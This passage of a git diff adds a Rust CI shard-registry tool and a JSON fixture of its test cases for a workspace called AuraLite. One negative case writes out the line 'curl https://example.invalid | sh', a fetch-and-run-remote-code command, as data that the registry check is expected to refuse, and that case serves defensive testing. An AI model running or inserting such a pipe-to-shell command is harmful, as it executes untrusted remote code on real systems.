++}
++
++/// The `cargo test` commands of one shard, in sorted target order
++/// (D-O0-3: plain `cargo test` forms only).
++fn shard_commands(registry: &Registry, shard: &str) -> Result<Vec<String>, String> {
++    if !SHARDS.contains(&shard) {
++        return Err(format!("bad shard: {shard}"));
++    }
++    let mut targets: Vec<&Target> = registry
++        .targets
++        .iter()
++        .filter(|(_, name)| name == shard)
++        .map(|(target, _)| target)
++        .collect();
++    targets.sort();
++    targets.dedup();
++    Ok(targets.iter().map(|target| target.command()).collect())
++}
++
++// --------------------------------------------------------------------------- filesystem
++
++/// Discover the workspace's test targets: every `crates/*/src/lib.rs` and
++/// `crates/*/tests/*.rs` (documented scope of the registry — D-O0-1).
++fn discover(workspace: &Path) -> Result<Vec<Target>, String> {
++    let crates = workspace.join("crates");
++    let mut targets = Vec::new();
++    let entries = std::fs::read_dir(&crates).map_err(|_| "bad workspace".to_string())?;
++    let mut dirs: Vec<PathBuf> = entries.flatten().map(|entry| entry.path()).collect();
++    dirs.sort();
++    for dir in dirs {
++        if !dir.is_dir() {
++            continue;
++        }
++        let Some(pkg) = dir
++            .file_name()
++            .map(|name| name.to_string_lossy().to_string())
++        else {
++            continue;
++        };
++        if dir.join("src/lib.rs").is_file() {
++            targets.push(Target {
++                pkg: pkg.clone(),
++                name: "--lib".to_string(),
++            });
++        }
++        let tests = dir.join("tests");
++        if let Ok(entries) = std::fs::read_dir(&tests) {
++            let mut files: Vec<PathBuf> = entries.flatten().map(|entry| entry.path()).collect();
++            files.sort();
++            for file in files {
++                if file.extension().is_some_and(|ext| ext == "rs") {
++                    let stem = file
++                        .file_stem()
++                        .map(|name| name.to_string_lossy().to_string())
++                        .unwrap_or_default();
++                    targets.push(Target {
++                        pkg: pkg.clone(),
++                        name: stem,
++                    });
++                }
++            }
++        }
++    }
++    targets.sort();
++    Ok(targets)
++}
++
++/// Render a fresh registry: lane-table assignment (D-O0-1), preserving
++/// disabled flags and the canonical main pins.
++fn sync_registry(inventory: &[Target], previous: Option<&Registry>) -> String {
++    let mut out = String::new();
++    out.push_str("# AuraLite CI shard registry (O0) — the target registry check reads this.\n");
++    out.push_str("# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test\n");
++    out.push_str("# (a shard that does not run its main test is a dead gate).\n");
++    out.push_str("# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).\n");
++    out.push_str(&format!("rule {RULE}\n"));
++    for name in SHARDS {
++        let disabled = previous
++            .map(|registry| {
++                registry
++                    .shards
++                    .iter()
++                    .any(|(declared, off)| declared == name && *off)
++            })
++            .unwrap_or(false);
++        out.push_str(&format!(
++            "shard {name} {}\n",
++            if disabled { "disabled" } else { "enabled" }
++        ));
++    }
++    for (index, name) in SHARDS.iter().enumerate() {
++        out.push_str(&format!("main {name} {}\n", MAIN[index]));
++    }
++    let mut sorted: Vec<&Target> = inventory.iter().collect();
++    sorted.sort();
++    sorted.dedup();
++    for target in sorted {
++        out.push_str(&format!(
++            "target {} shard {}\n",
++            target.key(),
++            target.lane()
++        ));
++    }
++    out
++}
++
++// --------------------------------------------------------------------------- CLI driver
++
++/// Read a whole file to text.
++fn read_text(path: &str) -> Result<String, String> {
++    std::fs::read_to_string(path).map_err(|_| format!("cannot read {path}"))
++}
++
++/// Collect `--flag value` pairs from the argument tail.
++fn flags(rest: &[String]) -> Result<std::collections::BTreeMap<String, String>, String> {
++    let mut map = std::collections::BTreeMap::new();
++    let mut index = 0;
++    while index < rest.len() {
++        let flag = &rest[index];
++        let name = flag
++            .strip_prefix("--")
++            .ok_or_else(|| format!("expected --flag, got {flag}"))?;
++        if index + 1 >= rest.len() {
++            return Err(format!("missing value for --{name}"));
++        }
++        map.insert(name.to_string(), rest[index + 1].clone());
++        index += 2;
++    }
++    Ok(map)
++}
++
++/// Load the inventory: `--inventory FILE`, else discover `--workspace DIR`
++/// (default `.`).
++fn load_inventory(map: &std::collections::BTreeMap<String, String>) -> Result<Vec<Target>, String> {
++    match map.get("inventory") {
++        Some(path) => parse_inventory(&read_text(path)?),
++        None => discover(Path::new(
++            map.get("workspace").map(String::as_str).unwrap_or("."),
++        )),
++    }
++}
++
++/// Execute one `aura-ci` command against the given streams; returns the exit
++/// code (0 ok, 64 usage, 65 refusal).
++pub fn run(args: &[String], out: &mut dyn Write, err: &mut dyn Write) -> i32 {
++    let mut dispatch = || -> Result<(), String> {
++        let (command, rest) = args.split_first().ok_or("usage:missing command")?;
++        let map = flags(rest).map_err(|message| format!("usage:{message}"))?;
++        let registry_path = map
++            .get("registry")
++            .cloned()
++            .unwrap_or_else(|| "ci/registry.txt".to_string());
++        let inventory = load_inventory(&map)?;
++        match command.as_str() {
++            "check" => {
++                let registry = parse_registry(&read_text(&registry_path)?)?;
++                let total = check(&inventory, &registry)?;
++                if let Some(path) = map.get("workflow") {
++                    check_workflow(&registry, &read_text(path)?)?;
++                }
++                let _ = writeln!(out, "registry=ok shards=10 targets={total}");
++                Ok(())
++            }
++            "coverage" => {
++                let registry = parse_registry(&read_text(&registry_path)?)?;
++                let report = coverage_report(&inventory, &registry)?;
++                let _ = write!(out, "{report}");
++                Ok(())
++            }
++            "run" => {
++                let registry = parse_registry(&read_text(&registry_path)?)?;
++                let shard = map
++                    .get("shard")
++                    .ok_or_else(|| "usage:missing --shard".to_string())?;
++                check(&inventory, &registry)?;
++                let commands = shard_commands(&registry, shard)?;
++                let _ = writeln!(out, "ci run shard {shard}");
++                for command in &commands {
++                    let _ = writeln!(out, "{command}");
++                }
++                if map.contains_key("exec") {
++                    for command in &commands {
++                        let mut parts = command.split_whitespace();
++                        let program = parts.next().unwrap_or("true");
++                        let status = std::process::Command::new(program)
++                            .args(parts)
++                            .status()
++                            .map_err(|_| format!("cannot run {command}"))?;
++                        if !status.success() {
++                            return Err(format!("command failed: {command}"));
++                        }
++                    }
++                }
++                Ok(())
++            }
++            "sync" => {
++                let previous = read_text(&registry_path)
++                    .ok()
++                    .and_then(|text| parse_registry(&text).ok());
++                let text = sync_registry(&inventory, previous.as_ref());
++                if let Some(parent) = Path::new(&registry_path).parent() {
++                    std::fs::create_dir_all(parent)
++                        .map_err(|_| "cannot write registry".to_string())?;
++                }
++                std::fs::write(&registry_path, text)
++                    .map_err(|_| "cannot write registry".to_string())?;
++                let _ = writeln!(out, "synced targets={} shards=10", inventory.len());
++                Ok(())
++            }
++            other => Err(format!("usage:unknown command {other}")),
++        }
++    };
++    match dispatch() {
++        Ok(()) => 0,
++        Err(message) => match message.strip_prefix("usage:") {
++            Some(detail) => {
++                let _ = writeln!(err, "error: usage: {detail}");
++                EXIT_USAGE
++            }
++            None => {
++                let _ = writeln!(err, "error: ci: {message}");
++                EXIT_REFUSED
++            }
++        },
++    }
++}
+diff --git a/crates/aura-testkit/src/lib.rs b/crates/aura-testkit/src/lib.rs
+index 6576dd1..56ea370 100644
+--- a/crates/aura-testkit/src/lib.rs
++++ b/crates/aura-testkit/src/lib.rs
+@@ -13,6 +13,8 @@
+ #![forbid(unsafe_code)]
+ #![deny(missing_docs)]
+ 
++pub mod ci;
++
+ use std::panic::{AssertUnwindSafe, catch_unwind};
+ use std::time::{Duration, Instant};
+ 
+diff --git a/crates/aura-testkit/tests/fixtures/o0_ci_vectors.json b/crates/aura-testkit/tests/fixtures/o0_ci_vectors.json
+new file mode 100644
+index 0000000..c63af95
+--- /dev/null
++++ b/crates/aura-testkit/tests/fixtures/o0_ci_vectors.json
+@@ -0,0 +1,227 @@
++{
++ "gate": "O0 CI baseline: 10/10 cases pass; named negative control disabled_shard_refused red on the dropped enabled-check; 6/6 NC red under tools/nc_o0.py; disable a shard -> CI red (target registry check)",
++ "notice": "Independent Python oracle (tools/gen_o0_vectors.py); verifier: crates/aura-testkit/tests/o0_ci.rs against aura_testkit::ci. Replace the whole file only with tools/gen_o0_vectors.py output.",
++ "named_control": "disabled_shard_refused",
++ "files": {},
++ "cases": [
++  {
++   "name": "registry_valid_passes",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--registry",
++     "registry.txt",
++     "--inventory",
++     "inventory.txt"
++    ],
++    [
++     "coverage",
++     "--registry",
++     "registry.txt",
++     "--inventory",
++     "inventory.txt"
++    ]
++   ],
++   "exit": 0,
++   "stdout": "registry=ok shards=10 targets=20\nci coverage report v1\nrule lanes-v1\nshards 10\ntargets 20\nshard core targets=2\nshard state targets=2\nshard exec targets=2\nshard consensus targets=2\nshard net targets=2\nshard node targets=2\nshard wallet targets=2\nshard ecosystem targets=2\nshard security targets=2\nshard perf targets=2\ntarget_coverage 20/20 (100.0%)\n",
++   "stderr": "",
++   "files": {
++    "inventory.txt": "inventory v1\ntarget aura-alpha/--lib\ntarget aura-alpha/a01\ntarget aura-beta/--lib\ntarget aura-beta/b01\ntarget aura-delta/--lib\ntarget aura-delta/d01\ntarget aura-epsilon/--lib\ntarget aura-epsilon/e01\ntarget aura-eta/--lib\ntarget aura-eta/w01\ntarget aura-gamma/--lib\ntarget aura-gamma/g01\ntarget aura-iota/--lib\ntarget aura-iota/h01\ntarget aura-kappa/--lib\ntarget aura-kappa/k01\ntarget aura-theta/--lib\ntarget aura-theta/t01\ntarget aura-zeta/--lib\ntarget aura-zeta/z01\n",
++    "registry.txt": "# AuraLite CI shard registry (O0) \u2014 the target registry check reads this.\n# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test\n# (a shard that does not run its main test is a dead gate).\n# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).\nrule lanes-v1\nshard core enabled\nshard state enabled\nshard exec enabled\nshard consensus enabled\nshard net enabled\nshard node enabled\nshard wallet enabled\nshard ecosystem enabled\nshard security enabled\nshard perf enabled\nmain core aura-alpha/a01\nmain state aura-beta/b01\nmain exec aura-gamma/g01\nmain consensus aura-delta/d01\nmain net aura-epsilon/e01\nmain node aura-zeta/z01\nmain wallet aura-eta/w01\nmain ecosystem aura-theta/t01\nmain security aura-iota/h01\nmain perf aura-kappa/k01\ntarget aura-alpha/--lib shard core\ntarget aura-alpha/a01 shard core\ntarget aura-beta/--lib shard state\ntarget aura-beta/b01 shard state\ntarget aura-gamma/--lib shard exec\ntarget aura-gamma/g01 shard exec\ntarget aura-delta/--lib shard consensus\ntarget aura-delta/d01 shard consensus\ntarget aura-epsilon/--lib shard net\ntarget aura-epsilon/e01 shard net\ntarget aura-zeta/--lib shard node\ntarget aura-zeta/z01 shard node\ntarget aura-eta/--lib shard wallet\ntarget aura-eta/w01 shard wallet\ntarget aura-theta/--lib shard ecosystem\ntarget aura-theta/t01 shard ecosystem\ntarget aura-iota/--lib shard security\ntarget aura-iota/h01 shard security\ntarget aura-kappa/--lib shard perf\ntarget aura-kappa/k01 shard perf\n"
++   },
++   "phase": "O0"
++  },
++  {
++   "name": "run_emits_make_test_commands",
++   "sandbox": "",
++   "argv": [
++    [
++     "run",
++     "--registry",
++     "registry.txt",
++     "--inventory",
++     "inventory.txt",
++     "--shard",
++     "core"
++    ]
++   ],
++   "exit": 0,
++   "stdout": "ci run shard core\ncargo test -p aura-alpha --lib\ncargo test -p aura-alpha --test a01\n",
++   "stderr": "",
++   "files": {
++    "inventory.txt": "inventory v1\ntarget aura-alpha/--lib\ntarget aura-alpha/a01\ntarget aura-beta/--lib\ntarget aura-beta/b01\ntarget aura-delta/--lib\ntarget aura-delta/d01\ntarget aura-epsilon/--lib\ntarget aura-epsilon/e01\ntarget aura-eta/--lib\ntarget aura-eta/w01\ntarget aura-gamma/--lib\ntarget aura-gamma/g01\ntarget aura-iota/--lib\ntarget aura-iota/h01\ntarget aura-kappa/--lib\ntarget aura-kappa/k01\ntarget aura-theta/--lib\ntarget aura-theta/t01\ntarget aura-zeta/--lib\ntarget aura-zeta/z01\n",
++    "registry.txt": "# AuraLite CI shard registry (O0) \u2014 the target registry check reads this.\n# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test\n# (a shard that does not run its main test is a dead gate).\n# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).\nrule lanes-v1\nshard core enabled\nshard state enabled\nshard exec enabled\nshard consensus enabled\nshard net enabled\nshard node enabled\nshard wallet enabled\nshard ecosystem enabled\nshard security enabled\nshard perf enabled\nmain core aura-alpha/a01\nmain state aura-beta/b01\nmain exec aura-gamma/g01\nmain consensus aura-delta/d01\nmain net aura-epsilon/e01\nmain node aura-zeta/z01\nmain wallet aura-eta/w01\nmain ecosystem aura-theta/t01\nmain security aura-iota/h01\nmain perf aura-kappa/k01\ntarget aura-alpha/--lib shard core\ntarget aura-alpha/a01 shard core\ntarget aura-beta/--lib shard state\ntarget aura-beta/b01 shard state\ntarget aura-gamma/--lib shard exec\ntarget aura-gamma/g01 shard exec\ntarget aura-delta/--lib shard consensus\ntarget aura-delta/d01 shard consensus\ntarget aura-epsilon/--lib shard net\ntarget aura-epsilon/e01 shard net\ntarget aura-zeta/--lib shard node\ntarget aura-zeta/z01 shard node\ntarget aura-eta/--lib shard wallet\ntarget aura-eta/w01 shard wallet\ntarget aura-theta/--lib shard ecosystem\ntarget aura-theta/t01 shard ecosystem\ntarget aura-iota/--lib shard security\ntarget aura-iota/h01 shard security\ntarget aura-kappa/--lib shard perf\ntarget aura-kappa/k01 shard perf\n"
++   }
++  },
++  {
++   "name": "disabled_shard_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--registry",
++     "registry.txt",
++     "--inventory",
++     "inventory.txt"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: ci: shard security disabled\n",
++   "nc_ref": 1,
++   "files": {
++    "inventory.txt": "inventory v1\ntarget aura-alpha/--lib\ntarget aura-alpha/a01\ntarget aura-beta/--lib\ntarget aura-beta/b01\ntarget aura-delta/--lib\ntarget aura-delta/d01\ntarget aura-epsilon/--lib\ntarget aura-epsilon/e01\ntarget aura-eta/--lib\ntarget aura-eta/w01\ntarget aura-gamma/--lib\ntarget aura-gamma/g01\ntarget aura-iota/--lib\ntarget aura-iota/h01\ntarget aura-kappa/--lib\ntarget aura-kappa/k01\ntarget aura-theta/--lib\ntarget aura-theta/t01\ntarget aura-zeta/--lib\ntarget aura-zeta/z01\n",
++    "registry.txt": "# AuraLite CI shard registry (O0) \u2014 the target registry check reads this.\n# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test\n# (a shard that does not run its main test is a dead gate).\n# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).\nrule lanes-v1\nshard core enabled\nshard state enabled\nshard exec enabled\nshard consensus enabled\nshard net enabled\nshard node enabled\nshard wallet enabled\nshard ecosystem enabled\nshard security disabled\nshard perf enabled\nmain core aura-alpha/a01\nmain state aura-beta/b01\nmain exec aura-gamma/g01\nmain consensus aura-delta/d01\nmain net aura-epsilon/e01\nmain node aura-zeta/z01\nmain wallet aura-eta/w01\nmain ecosystem aura-theta/t01\nmain security aura-iota/h01\nmain perf aura-kappa/k01\ntarget aura-alpha/--lib shard core\ntarget aura-alpha/a01 shard core\ntarget aura-beta/--lib shard state\ntarget aura-beta/b01 shard state\ntarget aura-gamma/--lib shard exec\ntarget aura-gamma/g01 shard exec\ntarget aura-delta/--lib shard consensus\ntarget aura-delta/d01 shard consensus\ntarget aura-epsilon/--lib shard net\ntarget aura-epsilon/e01 shard net\ntarget aura-zeta/--lib shard node\ntarget aura-zeta/z01 shard node\ntarget aura-eta/--lib shard wallet\ntarget aura-eta/w01 shard wallet\ntarget aura-theta/--lib shard ecosystem\ntarget aura-theta/t01 shard ecosystem\ntarget aura-iota/--lib shard security\ntarget aura-iota/h01 shard security\ntarget aura-kappa/--lib shard perf\ntarget aura-kappa/k01 shard perf\n"
++   }
++  },
++  {
++   "name": "missing_target_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--registry",
++     "registry.txt",
++     "--inventory",
++     "inventory.txt"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: ci: unregistered target: aura-alpha/--lib\n",
++   "nc_ref": 2,
++   "files": {
++    "inventory.txt": "inventory v1\ntarget aura-alpha/--lib\ntarget aura-alpha/a01\ntarget aura-beta/--lib\ntarget aura-beta/b01\ntarget aura-delta/--lib\ntarget aura-delta/d01\ntarget aura-epsilon/--lib\ntarget aura-epsilon/e01\ntarget aura-eta/--lib\ntarget aura-eta/w01\ntarget aura-gamma/--lib\ntarget aura-gamma/g01\ntarget aura-iota/--lib\ntarget aura-iota/h01\ntarget aura-kappa/--lib\ntarget aura-kappa/k01\ntarget aura-theta/--lib\ntarget aura-theta/t01\ntarget aura-zeta/--lib\ntarget aura-zeta/z01\n",
++    "registry.txt": "# AuraLite CI shard registry (O0) \u2014 the target registry check reads this.\n# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test\n# (a shard that does not run its main test is a dead gate).\n# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).\nrule lanes-v1\nshard core enabled\nshard state enabled\nshard exec enabled\nshard consensus enabled\nshard net enabled\nshard node enabled\nshard wallet enabled\nshard ecosystem enabled\nshard security enabled\nshard perf enabled\nmain core aura-alpha/a01\nmain state aura-beta/b01\nmain exec aura-gamma/g01\nmain consensus aura-delta/d01\nmain net aura-epsilon/e01\nmain node aura-zeta/z01\nmain wallet aura-eta/w01\nmain ecosystem aura-theta/t01\nmain security aura-iota/h01\nmain perf aura-kappa/k01\ntarget aura-alpha/a01 shard core\ntarget aura-beta/--lib shard state\ntarget aura-beta/b01 shard state\ntarget aura-gamma/--lib shard exec\ntarget aura-gamma/g01 shard exec\ntarget aura-delta/--lib shard consensus\ntarget aura-delta/d01 shard consensus\ntarget aura-epsilon/--lib shard net\ntarget aura-epsilon/e01 shard net\ntarget aura-zeta/--lib shard node\ntarget aura-zeta/z01 shard node\ntarget aura-eta/--lib shard wallet\ntarget aura-eta/w01 shard wallet\ntarget aura-theta/--lib shard ecosystem\ntarget aura-theta/t01 shard ecosystem\ntarget aura-iota/--lib shard security\ntarget aura-iota/h01 shard security\ntarget aura-kappa/--lib shard perf\ntarget aura-kappa/k01 shard perf\n"
++   }
++  },
++  {
++   "name": "duplicate_target_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--registry",
++     "registry.txt",
++     "--inventory",
++     "inventory.txt"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: ci: target in two shards: aura-beta/b01\n",
++   "nc_ref": 3,
++   "files": {
++    "inventory.txt": "inventory v1\ntarget aura-alpha/--lib\ntarget aura-alpha/a01\ntarget aura-beta/--lib\ntarget aura-beta/b01\ntarget aura-delta/--lib\ntarget aura-delta/d01\ntarget aura-epsilon/--lib\ntarget aura-epsilon/e01\ntarget aura-eta/--lib\ntarget aura-eta/w01\ntarget aura-gamma/--lib\ntarget aura-gamma/g01\ntarget aura-iota/--lib\ntarget aura-iota/h01\ntarget aura-kappa/--lib\ntarget aura-kappa/k01\ntarget aura-theta/--lib\ntarget aura-theta/t01\ntarget aura-zeta/--lib\ntarget aura-zeta/z01\n",
++    "registry.txt": "# AuraLite CI shard registry (O0) \u2014 the target registry check reads this.\n# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test\n# (a shard that does not run its main test is a dead gate).\n# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).\nrule lanes-v1\nshard core enabled\nshard state enabled\nshard exec enabled\nshard consensus enabled\nshard net enabled\nshard node enabled\nshard wallet enabled\nshard ecosystem enabled\nshard security enabled\nshard perf enabled\nmain core aura-alpha/a01\nmain state aura-beta/b01\nmain exec aura-gamma/g01\nmain consensus aura-delta/d01\nmain net aura-epsilon/e01\nmain node aura-zeta/z01\nmain wallet aura-eta/w01\nmain ecosystem aura-theta/t01\nmain security aura-iota/h01\nmain perf aura-kappa/k01\ntarget aura-alpha/--lib shard core\ntarget aura-alpha/a01 shard core\ntarget aura-beta/--lib shard state\ntarget aura-beta/b01 shard state\ntarget aura-gamma/--lib shard exec\ntarget aura-gamma/g01 shard exec\ntarget aura-delta/--lib shard consensus\ntarget aura-delta/d01 shard consensus\ntarget aura-epsilon/--lib shard net\ntarget aura-epsilon/e01 shard net\ntarget aura-zeta/--lib shard node\ntarget aura-zeta/z01 shard node\ntarget aura-eta/--lib shard wallet\ntarget aura-eta/w01 shard wallet\ntarget aura-theta/--lib shard ecosystem\ntarget aura-theta/t01 shard ecosystem\ntarget aura-iota/--lib shard security\ntarget aura-iota/h01 shard security\ntarget aura-kappa/--lib shard perf\ntarget aura-kappa/k01 shard perf\ntarget aura-beta/b01 shard core\n"
++   }
++  },
++  {
++   "name": "shard_set_mismatch_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--registry",
++     "registry.txt",
++     "--inventory",
++     "inventory.txt"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: ci: missing shard: core\n",
++   "nc_ref": 4,
++   "files": {
++    "inventory.txt": "inventory v1\ntarget aura-alpha/--lib\ntarget aura-alpha/a01\ntarget aura-beta/--lib\ntarget aura-beta/b01\ntarget aura-delta/--lib\ntarget aura-delta/d01\ntarget aura-epsilon/--lib\ntarget aura-epsilon/e01\ntarget aura-eta/--lib\ntarget aura-eta/w01\ntarget aura-gamma/--lib\ntarget aura-gamma/g01\ntarget aura-iota/--lib\ntarget aura-iota/h01\ntarget aura-kappa/--lib\ntarget aura-kappa/k01\ntarget aura-theta/--lib\ntarget aura-theta/t01\ntarget aura-zeta/--lib\ntarget aura-zeta/z01\n",
++    "registry.txt": "# AuraLite CI shard registry (O0) \u2014 the target registry check reads this.\n# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test\n# (a shard that does not run its main test is a dead gate).\n# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).\nrule lanes-v1\nshard ops enabled\nshard state enabled\nshard exec enabled\nshard consensus enabled\nshard net enabled\nshard node enabled\nshard wallet enabled\nshard ecosystem enabled\nshard security enabled\nshard perf enabled\nmain ops aura-ops/main\nmain state aura-beta/b01\nmain exec aura-gamma/g01\nmain consensus aura-delta/d01\nmain net aura-epsilon/e01\nmain node aura-zeta/z01\nmain wallet aura-eta/w01\nmain ecosystem aura-theta/t01\nmain security aura-iota/h01\nmain perf aura-kappa/k01\ntarget aura-alpha/--lib shard core\ntarget aura-alpha/a01 shard core\ntarget aura-beta/--lib shard state\ntarget aura-beta/b01 shard state\ntarget aura-gamma/--lib shard exec\ntarget aura-gamma/g01 shard exec\ntarget aura-delta/--lib shard consensus\ntarget aura-delta/d01 shard consensus\ntarget aura-epsilon/--lib shard net\ntarget aura-epsilon/e01 shard net\ntarget aura-zeta/--lib shard node\ntarget aura-zeta/z01 shard node\ntarget aura-eta/--lib shard wallet\ntarget aura-eta/w01 shard wallet\ntarget aura-theta/--lib shard ecosystem\ntarget aura-theta/t01 shard ecosystem\ntarget aura-iota/--lib shard security\ntarget aura-iota/h01 shard security\ntarget aura-kappa/--lib shard perf\ntarget aura-kappa/k01 shard perf\n"
++   }
++  },
++  {
++   "name": "empty_shard_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--registry",
++     "registry.txt",
++     "--inventory",
++     "inventory.txt"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: ci: shard net empty\n",
++   "nc_ref": 5,
++   "files": {
++    "inventory.txt": "inventory v1\ntarget aura-alpha/--lib\ntarget aura-alpha/a01\ntarget aura-beta/--lib\ntarget aura-beta/b01\ntarget aura-delta/--lib\ntarget aura-delta/d01\ntarget aura-epsilon/--lib\ntarget aura-epsilon/e01\ntarget aura-eta/--lib\ntarget aura-eta/w01\ntarget aura-gamma/--lib\ntarget aura-gamma/g01\ntarget aura-iota/--lib\ntarget aura-iota/h01\ntarget aura-kappa/--lib\ntarget aura-kappa/k01\ntarget aura-theta/--lib\ntarget aura-theta/t01\ntarget aura-zeta/--lib\ntarget aura-zeta/z01\n",
++    "registry.txt": "# AuraLite CI shard registry (O0) \u2014 the target registry check reads this.\n# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test\n# (a shard that does not run its main test is a dead gate).\n# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).\nrule lanes-v1\nshard core enabled\nshard state enabled\nshard exec enabled\nshard consensus enabled\nshard net enabled\nshard node enabled\nshard wallet enabled\nshard ecosystem enabled\nshard security enabled\nshard perf enabled\nmain core aura-alpha/a01\nmain state aura-beta/b01\nmain exec aura-gamma/g01\nmain consensus aura-delta/d01\nmain net aura-epsilon/e01\nmain node aura-zeta/z01\nmain wallet aura-eta/w01\nmain ecosystem aura-theta/t01\nmain security aura-iota/h01\nmain perf aura-kappa/k01\ntarget aura-alpha/--lib shard core\ntarget aura-alpha/a01 shard core\ntarget aura-beta/--lib shard state\ntarget aura-beta/b01 shard state\ntarget aura-gamma/--lib shard exec\ntarget aura-gamma/g01 shard exec\ntarget aura-delta/--lib shard consensus\ntarget aura-delta/d01 shard consensus\ntarget aura-epsilon/--lib shard node\ntarget aura-epsilon/e01 shard node\ntarget aura-zeta/--lib shard node\ntarget aura-zeta/z01 shard node\ntarget aura-eta/--lib shard wallet\ntarget aura-eta/w01 shard wallet\ntarget aura-theta/--lib shard ecosystem\ntarget aura-theta/t01 shard ecosystem\ntarget aura-iota/--lib shard security\ntarget aura-iota/h01 shard security\ntarget aura-kappa/--lib shard perf\ntarget aura-kappa/k01 shard perf\n"
++   }
++  },
++  {
++   "name": "shard_main_dead_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--registry",
++     "registry.txt",
++     "--inventory",
++     "inventory.txt"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: ci: shard core main dead: aura-beta/b01\n",
++   "files": {
++    "inventory.txt": "inventory v1\ntarget aura-alpha/--lib\ntarget aura-alpha/a01\ntarget aura-beta/--lib\ntarget aura-beta/b01\ntarget aura-delta/--lib\ntarget aura-delta/d01\ntarget aura-epsilon/--lib\ntarget aura-epsilon/e01\ntarget aura-eta/--lib\ntarget aura-eta/w01\ntarget aura-gamma/--lib\ntarget aura-gamma/g01\ntarget aura-iota/--lib\ntarget aura-iota/h01\ntarget aura-kappa/--lib\ntarget aura-kappa/k01\ntarget aura-theta/--lib\ntarget aura-theta/t01\ntarget aura-zeta/--lib\ntarget aura-zeta/z01\n",
++    "registry.txt": "# AuraLite CI shard registry (O0) \u2014 the target registry check reads this.\n# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test\n# (a shard that does not run its main test is a dead gate).\n# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).\nrule lanes-v1\nshard core enabled\nshard state enabled\nshard exec enabled\nshard consensus enabled\nshard net enabled\nshard node enabled\nshard wallet enabled\nshard ecosystem enabled\nshard security enabled\nshard perf enabled\nmain core aura-beta/b01\nmain state aura-beta/b01\nmain exec aura-gamma/g01\nmain consensus aura-delta/d01\nmain net aura-epsilon/e01\nmain node aura-zeta/z01\nmain wallet aura-eta/w01\nmain ecosystem aura-theta/t01\nmain security aura-iota/h01\nmain perf aura-kappa/k01\ntarget aura-alpha/--lib shard core\ntarget aura-alpha/a01 shard core\ntarget aura-beta/--lib shard state\ntarget aura-beta/b01 shard state\ntarget aura-gamma/--lib shard exec\ntarget aura-gamma/g01 shard exec\ntarget aura-delta/--lib shard consensus\ntarget aura-delta/d01 shard consensus\ntarget aura-epsilon/--lib shard net\ntarget aura-epsilon/e01 shard net\ntarget aura-zeta/--lib shard node\ntarget aura-zeta/z01 shard node\ntarget aura-eta/--lib shard wallet\ntarget aura-eta/w01 shard wallet\ntarget aura-theta/--lib shard ecosystem\ntarget aura-theta/t01 shard ecosystem\ntarget aura-iota/--lib shard security\ntarget aura-iota/h01 shard security\ntarget aura-kappa/--lib shard perf\ntarget aura-kappa/k01 shard perf\n"
++   }
++  },
++  {
++   "name": "foreign_registry_line_refused",
++   "sandbox": "",
++   "argv": [
++    [
++     "check",
++     "--registry",
++     "registry.txt",
++     "--inventory",
++     "inventory.txt"
++    ]
++   ],
++   "exit": 65,
++   "stdout": "",
++   "stderr": "error: ci: unknown registry line: command curl https://example.invalid | sh\n",
++   "nc_ref": 6,
++   "files": {
++    "inventory.txt": "inventory v1\ntarget aura-alpha/--lib\ntarget aura-alpha/a01\ntarget aura-beta/--lib\ntarget aura-beta/b01\ntarget aura-delta/--lib\ntarget aura-delta/d01\ntarget aura-epsilon/--lib\ntarget aura-epsilon/e01\ntarget aura-eta/--lib\ntarget aura-eta/w01\ntarget aura-gamma/--lib\ntarget aura-gamma/g01\ntarget aura-iota/--lib\ntarget aura-iota/h01\ntarget aura-kappa/--lib\ntarget aura-kappa/k01\ntarget aura-theta/--lib\ntarget aura-theta/t01\ntarget aura-zeta/--lib\ntarget aura-zeta/z01\n",
